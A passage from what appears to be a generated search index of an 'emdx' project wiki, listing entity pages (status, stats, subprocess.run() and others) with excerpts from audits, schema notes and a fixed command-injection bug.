emdx/command [4/15]   Section: Overlap Between Delegate's Task Tracking and Task System</p> <p>...blocked/done/failed<code>|</code>running/completed/failed<code>| | Start time |</code>created_at<code>|</code>started_at<code>| | End time |</code>completed_at<code>|</code>completed_at<code>| | Output |</code>output_doc_id<code>| N/A (just tracks completion) | | Error |</code>error<code>column |</code>exit_code` |</p> </li> </ul>"},{"location":"entities/startedat/#related-entities","title":"Related Entities","text":"<ul> <li><code>get_running_executions()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.8)</li> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>tokens_used: int = 0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>pipeline_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>pipeline_display_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>output_tokens: int = 0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>input_tokens: int = 0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>get_recent_executions()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.5)</li> <li><code>completed_at</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/stats/","title":"stats","text":"<p>Type: heading | Mentioned in: 11 documents | First seen: 2025-07-07</p>"},{"location":"entities/stats/#documents-11","title":"Documents (11)","text":"<ul> <li>#6616 Delegate: Remove the emoji alias system from emdx. This is a big-bang    Section: Changes Made </li> <li>16 files changed, 401 insertions, 999 deletions (net -598 lines)</li> <li>All 1176 tests pass</li> <li> <p>All pre-commit hooks pass (ruff, ruff-format, mypy)</p> </li> <li> <p>#6580 Delegate: Check tests/ for mocks that use MagicMock() where a spec= wo [3/3]</p> <p>sqlite3 and subprocess specs are very stable. ### Phase 3: Nice-to-haves (P2)</p> </li> <li> <p><code>SingleResult</code> specs in recipe executor tests</p> </li> <li>Textual widget specs where imports are easy</li> </ul>"},{"location":"entities/stats/#stats_1","title":"Stats","text":""},{"location":"entities/stats/#stats_2","title":"Stats","text":"<p>| Category | Count | spec= used? | |----------|-------|-----------...</p> <ul> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: High Severity Issues (12)</p> </li> <li> <p>#6837 Delegate: list [1/2]   Section: Fix: Delegate subcommand routing (<code>list</code>, <code>running</code>, <code>stats</code>, etc.)</p> <p>Problem: <code>emdx delegate list</code> (and other subcommands like <code>running</code>, <code>stats</code>, <code>show</code>, etc.) were being treated as task prompts instead of routing to their subcommands. This is because Typer's <code>invoke_without_command=True</code> + variadic `[TASKS]...</p> </li> <li> <p>#6836 Delegate: list   Section: Summary</p> <p>The <code>emdx delegate</code> command now supports subcommands (<code>list</code>, <code>running</code>, <code>stats</code>, <code>show</code>, <code>logs</code>, <code>tail</code>, <code>kill</code>, <code>killall</code>, <code>health</code>, <code>monitor</code>) that were previously only accessible via <code>emdx exec</code> (now folded into delegate).</p> </li> <li> <p>#6833 Delegate: list   Section: Summary</p> <p>Two changes fix the issue where <code>emdx delegate list</code> (and other subcommands like <code>running</code>, <code>stats</code>, <code>show</code>, etc.) were being swallowed as task arguments instead of being routed to their subcommand handlers:</p> </li> <li> <p>#6825 Delegate: --help [2/2]   Section: Subcommands (Execution Management)</p> <p>...t<code>| List recent executions | |</code>running<code>| Show currently running executions | |</code>stats<code>| Show execution statistics | |</code>show<code>| Show execution details with integrated log viewer | |</code>logs<code>| Show only the logs for an execution (no metadata) | |</code>tail`...</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: System Components</p> <p>...\u2502 \u2502  \u2502 - execution hist \u2502        \u2502 - chain, discovery   \u2502           \u2502 \u2502  \u2502 - stats          \u2502        \u2502 - worktree, PR       \u2502           \u2502 \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502 \u2502...</p> </li> <li> <p>#267 Claude Implementation Comparison   Section: \ud83d\udcca Feature Comparison Matrix</p> <p>...| \u2705 All docs | | recent | \u2705 By access time | \u2705 Inherits | \u274c | \u2705 By date | | stats | \u2705 Basic stats | \u274c | \u274c | \u2705 Basic stats | | clip | \u2705 From clipboard | \u2705 Inherits | \u2705 Direct to DB | \u274c | | direct | \u274c | \u274c | \u2705 Direct save | \u274c | | note |...</p> </li> </ul>"},{"location":"entities/stats/#20-get_execution_stats-returns-untyped-dict","title":"20. <code>get_execution_stats()</code> returns untyped dict","text":"<p>File: <code>emdx/models/executions.py:319</code> Issue: <code>def get_execution_stats() -&gt; dict:</code> - dict without type parameters Severity: HIGH</p>"},{"location":"entities/stats/#related-entities","title":"Related Entities","text":"<ul> <li><code>\ud83d\udfe2\u2192active</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>task types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>task granularity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>status flow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>services layer integration points</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>sequential pipeline</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>remove emoji alias system from emdx</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>remove emoji alias system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>recovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>phase 5: test updates</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/status/","title":"status","text":"<p>Type: tech_term | Mentioned in: 17 documents | First seen: 2026-02-13</p>"},{"location":"entities/status/#documents-17","title":"Documents (17)","text":"<ul> <li>#6859 Delegate: FEAT-30 (Issue #1242): Add wiki topic skip and pin commands. [1/4]   Section: Changes made: <p><code>emdx/commands/maintain.py</code> \u2014 Added 4 new wiki subcommands and styled status display:</p> </li> <li><code>emdx maintain wiki skip &lt;topic_id&gt;</code> \u2014 sets status to <code>'skipped'</code></li> <li><code>emdx maintain wiki unskip &lt;topic_id&gt;</code> \u2014 resets to <code>'active'</code></li> <li> <p>`emdx maintain wiki pi...</p> </li> <li> <p>#6710 Delegate: Design a unified dashboard data model. Given that we want to [4/4]   Section: The Core Insight: <code>ActivityItem</code> IS the Dashboard Item</p> <p>...py:15<code>) already provides the right abstraction \u2014</code>item_id<code>,</code>title<code>,</code>timestamp<code>,</code>status<code>,</code>doc_id<code>,</code>cost<code>, plus virtual properties</code>item_type<code>,</code>type_icon<code>,</code>status_icon<code>, and</code>get_preview_content()`. Documents and executions are already subclasses. Th...</p> </li> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...gates | | <code>doc_title</code> | TEXT NOT NULL | Human-readable title of the execution | | <code>status</code> | TEXT NOT NULL | <code>'running'</code>, <code>'completed'</code>, or <code>'failed'</code> | | <code>started_at</code> | TIMESTAMP NOT NULL | When execution began | | <code>completed_at</code> | TIMESTAMP (nullable) |...</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <p>...cade run data used by <code>CascadeRunItem</code> in the activity view. Fields include <code>id</code>, <code>status</code>, <code>started_at</code>, <code>completed_at</code>, <code>pipeline_name</code>, <code>pipeline_display_name</code>, <code>current_stage</code>, <code>initial_doc_title</code>, <code>doc_id</code>, <code>error_message</code>.</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: emdx/commands/delegate.py</p> <p>...title: str,     prompt: str | None = None,     task_type: str = \"single\",     status: str = \"active\",     source_doc_id: int | None = None,     parent_task_id: int | None = None,     seq: int | None = None,     tags: str | None = None,     epic_key:...</p> </li> <li> <p>#6477 EMDX Task System: Unified Architecture and Simplification Strategy   Section: 1. Core Overlap: Tasks vs Tagged Documents**</p> <p>...cument + Tags Alternative | |---------|------------|---------------------------| | Status tracking | <code>status</code> column (open/active/blocked/done/failed) | Status tags: \ud83d\ude80active, \u2705done, \ud83d\udea7blocked, \u274cfailed | | Planning context | <code>gameplan_id</code> \u2192 documents | `par...</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: System Components</p> <p>...\u2502 \u2502  \u2502 - dependencies   \u2502        \u2502 - update, log, delete\u2502           \u2502 \u2502  \u2502 - status mgmt    \u2502        \u2502 - run, manual, retry \u2502           \u2502 \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502 \u2502           \u2502...</p> </li> <li> <p>#6383 Strategy: EMDX as Agent Workspace   Section: The Shift</p> <p>...laude Code's work queue. The human reads it, Claude Code consumes it.</p> </li> <li><code>prime</code>/<code>status</code> \u2014 session bootstrapping for Claude Code.</li> <li> <p><code>save</code>/<code>find</code>/<code>tag</code> \u2014 still useful to humans, but increasingly as a way to read what Claude Code produced.</p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]   Section: Summary</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 4: API Surface</p> <ul> <li><code>status</code> and <code>prime</code> overlap \u2014 could merge</li> </ul> </li> <li><code>find</code> has 17 params \u2014 4 date filters \u2192 <code>--since</code>/<code>--until</code></li> <li>Search across 3 commands \u2192 consolidate under <code>find --semantic</code></li> <li> <p>~95 CLI commands, reducible ~15-20%</p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 1. Command Redundancy - HIGH IMPACT</p> <p>Status/Prime overlap:</p> </li> <li><code>emdx status</code> and <code>emdx prime</code> have significant overlap - both show tasks, cascade queue, and execution state</li> <li> <p>Suggestion: Merge into single command with <code>--json</code>/<code>--verbose</code> flags for different use cases</p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: delegate.py - Execution Creation Flow</p> <p>...title=doc_title,        prompt=prompt[:500],        task_type=\"single\",        status=\"active\",        source_doc_id=source_doc_id,        parent_task_id=parent_task_id,        seq=seq,        tags=\",\".join(tags) if tags else None,    )    ```</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Overview</p> <p>...provides hierarchical task management, dependency tracking, execution history, and status monitoring.</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 1. Executions Table (<code>models/executions.py</code>)</p> <p>...onal document being executed | | <code>doc_title</code> | TEXT | Title for the execution | | <code>status</code> | TEXT | running/completed/failed | | <code>started_at</code> | TIMESTAMP | When execution began | | <code>completed_at</code> | TIMESTAMP | When execution finished | | <code>log_file</code> | TEXT...</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: What the TUI Actually Shows</p> <p>...mpleted Claude agent sessions</p> </li> <li>Real-time log streaming for running agents</li> <li> <p>Status bar with cost, tokens, activity sparkline</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Task Fields</p> <p>...| required | Task title | | <code>description</code> | TEXT | \"\" | Optional description | | <code>status</code> | TEXT | \"open\" | Current state | | <code>priority</code> | INTEGER | 3 | Priority (1=highest) | | <code>gameplan_id</code> | INTEGER | NULL | FK to documents (optional gameplan associat...</p> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]   Section: Overview</p> <p>The <code>prime</code> and <code>status</code> commands both surface task information but serve different purposes and query different task schemas.</p> </li> </ul>"},{"location":"entities/status/#bug-4-status-not-validated-in-task-creation","title":"Bug #4: Status Not Validated in Task Creation","text":"<p>File: tasks.py:34 Severity: LOW</p>"},{"location":"entities/status/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>depends_on</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.4)</li> <li><code>gameplan_id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.2)</li> <li><code>dependency system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.2)</li> <li><code>cycle detection</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.2)</li> <li><code>retry_of</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.2)</li> <li><code>get_active_delegate_tasks()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.2)</li> <li><code>description</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.2)</li> </ul>"},{"location":"entities/statuspy/","title":"status.py","text":"<p>Type: heading | Mentioned in: 12 documents | First seen: 2026-02-13</p>"},{"location":"entities/statuspy/#documents-12","title":"Documents (12)","text":"<ul> <li> <p>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis</p> </li> <li> <p>#6435 Any/None typing audit [3/5]   Section: Summary</p> <p>...------|-------------|-----------------| | cascade.py | 1 | 1 | Yes (doc param) | | status.py | 1 | 1 | Partial | | analyze.py | 7 | 7 | Yes (new TypedDicts) | | prime.py | 6 | 6 | Yes (partial) | | recipe.py | 1 | 1 | Yes (doc param) | | briefing.py | 6 | 5...</p> </li> <li> <p>#6542 Delegate Enhancement Gameplans [5/5]   Section: Architecture Decision</p> <p>...asks.py`)</p> </li> <li><code>get_failed_tasks()</code> already exists in <code>models/tasks.py</code> (line 413)</li> <li><code>status.py</code> already implements <code>_show_failed_tasks()</code> using this function</li> <li>Tasks have <code>prompt</code> field which is needed for the retry command</li> <li> <p>Executions don't have error messag...</p> </li> <li> <p>#6411 Delegate: Implement 'emdx briefing' command. This is a new command tha   Section: Implementation Details</p> <p>...- JSON output mode for programmatic consumption</p> </li> <li>Follows existing patterns from <code>status.py</code> and <code>prime.py</code></li> <li> <p>All ruff lint checks pass</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement</p> <p>...atabase/`:</p> </li> <li><code>cascade.py</code> imports <code>cascade_db</code>, <code>get_document</code>, <code>save_document</code></li> <li><code>status.py</code>, <code>analyze.py</code>, <code>prime.py</code> import <code>db_connection</code> directly</li> <li> <p><code>recipe.py</code> imports <code>get_document</code>, <code>search_documents</code></p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 3. Inconsistent Patterns</p> </li> <li>Most files: <code>from emdx.utils.output import console</code></li> <li><code>cascade.py</code>: <code>console = Console()</code> (creates new instance)</li> <li> <p><code>status.py</code>: <code>console = Console()</code> (creates new instance)</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...s.py`: hierarchical document organization</p> </li> <li><code>prime.py</code>: session priming context</li> <li> <p><code>status.py</code>: project status overview</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: 3. HIGH: <code>commands/status.py</code> Has Direct Database Access**</p> <p>File: <code>commands/status.py</code> (lines 190-218)</p> </li> <li> <p>#6279 Delegate: DEBT-8: Standardize CLI interfaces. Standardize doc_id param   Section: 1. Added Help Text to Typer Apps (9 files)</p> <p>...Gist integration\" | | <code>executions.py</code> | \"Manage and monitor task executions\" | | <code>status.py</code> | \"Show delegate activity and project status\" | | <code>prime.py</code> | \"Output priming context for Claude session injection\" | | <code>analyze.py</code> | \"Analyze documents and extra...</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...similarity.py<code>| \u26a0\ufe0f PARTIAL (tests service, some CLI in</code>test_similarity.py<code>) | |</code>status.py<code>| \u274c NO | |</code>tags.py<code>| \u2705 YES (</code>test_commands_tags.py<code>) | |</code>tasks.py<code>| \u274c NO | |</code>trash.py` | \u274c NO |</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...USEFUL - Session priming for Claude. Provides context for new sessions. | | status.py | 260 | USEFUL - Quick overview of active work and recent activity. |</p> </li> <li> <p>#6259 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [17/37]   Section: Changes Made</p> <p>...*: Task/execution update failures now logged to stderr with task/execution IDs</p> </li> <li>status.py: Added module logger, cascade status errors logged at debug level  </li> <li>prime.py: Added module logger, cascade status errors logged at debug level</li> <li>core.py:...</li> </ul>"},{"location":"entities/statuspy/#statuspy_1","title":"status.py","text":"<p>No <code>| None</code> annotations on Typer params. Internal <code>_parse_timestamp</code> returns <code>datetime | None</code> - Legitimate.</p>"},{"location":"entities/statuspy/#31-console-import-low","title":"3.1 Console Import (LOW)","text":""},{"location":"entities/statuspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.8)</li> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>prime.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=5.6)</li> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>briefing.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>recipe.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.4)</li> <li><code>trash.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.3)</li> <li><code>browse.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.1)</li> <li><code>gist.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.1)</li> <li><code>review.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> </ul>"},{"location":"entities/subprocessrun/","title":"subprocess.run()","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-14</p>"},{"location":"entities/subprocessrun/#documents-12","title":"Documents (12)","text":"<ul> <li>#6758 Delegate: Research how to get progress/status information from a runni   Section: 1. Current Architecture (delegate.py) <p>The delegate uses <code>subprocess.run()</code> with <code>capture_output=True</code> (line 523-531), which means:</p> </li> <li>All output is buffered until process exit - no intermediate data is available</li> <li> <p>The only signals curre...</p> </li> <li> <p>#6692 FEAT-12: Add --retry flag to delegate   Section: Changes (3 files, +443/-26 lines):</p> <p>...errors)</p> </li> <li>Added <code>_compute_backoff()</code> \u2014 exponential backoff with jitter</li> <li>Wrapped <code>subprocess.run()</code> in <code>_run_single()</code> with a retry loop</li> <li>Passes <code>retry</code> through <code>_run_parallel()</code> to per-task <code>_run_single()</code> calls</li> <li> <p>Each retry logs: `delegate: retry N/M after Xs (...</p> </li> <li> <p>#6468 Security Fix Implementation for EMDX Delegate Command   Section: Vulnerability Details</p> <p>Issue: The <code>--each</code> flag passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>, enabling arbitrary command execution:</p> </li> <li> <p>#6465 Security Audit and Fixes: EMDX Command Injection Vulnerability   Section: The Problem</p> <p>The <code>--each</code> flag accepted user-provided commands and executed them using <code>subprocess.run()</code> with <code>shell=True</code>:</p> </li> <li> <p>#6375 Codebase Bug Audit 2026-02-15 [3/10]   Section: Medium Bugs (Severity: MEDIUM)</p> <p>... <code>cli_executor/claude.py:195-200</code> &amp; <code>cli_executor/cursor.py:238-243</code> Issue:** <code>subprocess.run()</code> for version check has <code>timeout=5</code>, but status check has <code>timeout=10</code>. However, if these calls hang beyond timeout, the exception is caught but validation continues...</p> </li> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: The Vulnerability</p> <p>The <code>--each</code> flag passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>:</p> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> </li> <li> <p>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37]   Section: Summary</p> </li> </ul>"},{"location":"entities/subprocessrun/#the-vulnerability-cve-worthy","title":"The Vulnerability (CVE-worthy)","text":"<p>The <code>_run_discovery()</code> function at <code>emdx/commands/delegate.py:144</code> passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>:</p>"},{"location":"entities/subprocessrun/#the-vulnerability","title":"The Vulnerability","text":"<p>The <code>--each</code> flag in <code>emdx delegate</code> passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>:</p>"},{"location":"entities/subprocessrun/#related-entities","title":"Related Entities","text":"<ul> <li><code>shell metacharacter blocking</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>rg -l</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>pr #510</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>mdfind</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>find . -name '*.py'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>fd -e py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>before (vulnerable):</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>curl</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>security fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>git ls-files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/success-metrics/","title":"success metrics","text":"<p>Type: heading | Mentioned in: 14 documents | First seen: 2025-07-07</p>"},{"location":"entities/success-metrics/#documents-14","title":"Documents (14)","text":"<ul> <li>#6598 Delegate synthesis [synthesis] <p>Init Command (De-prioritized)</p> </li> </ul> <p>Research shows the best init is invisible. Recommended approach: - Database auto-initializes on first command (already happens) - No separate <code>emdx init</code> needed for MVP - If implemented, make it idempotent and insta...</p> <ul> <li>#6477 EMDX Task System: Unified Architecture and Simplification Strategy <p>Radical simplicity wins - If todo.txt can work with one file, we can work with 4 commands</p> </li> <li>Don't compete with Taskwarrior - Focus on AI execution, not task management</li> </ul>"},{"location":"entities/success-metrics/#success-metrics_1","title":"Success Metrics","text":"<ul> <li>Task CLI reduced from 12 to 4 commands</li> <li> <p>Code redu...</p> </li> <li> <p>#6474 EMDX Feature Implementation Synthesis</p> <p>\ud83d\udd04 Semantic Search Upgrade - Chunk-level retrieval</p> </li> <li>\ud83d\udd04 Dream Journal - Overnight KB consolidation</li> </ul>"},{"location":"entities/success-metrics/#success-metrics_2","title":"Success Metrics","text":"<ul> <li>Claude stops creating duplicate research docs across sessions</li> <li> <p>KB grows in depth (updated docs) rather than just breadth...</p> </li> <li> <p>#6473 EMDX Strategy: The Dual-Interface Knowledge Layer</p> <p>It's the memory that makes agent work valuable beyond single sessions. ## Success Metrics</p> </li> <li> <p>Adoption: Agents using EMDX beyond just the creator 2.</p> </li> <li> <p>#4894 Parallel Analysis (Reusable) - Parallel_Explore Synthesis</p> <p>What is missing is architectural documentation, type completeness, and keeping docs current with code. ---</p> </li> </ul>"},{"location":"entities/success-metrics/#prioritized-recommendations","title":"Prioritized Recommendations","text":""},{"location":"entities/success-metrics/#tier-1-critical-fix-this-sprint","title":"Tier 1: Critical (Fix This Sprint)","text":"<p>1.1 Replace O(n\u00b2) Duplicate Detection - File: `emdx/services/dupli...</p> <ul> <li> <p>#4746 Parallel Analysis (Reusable) - 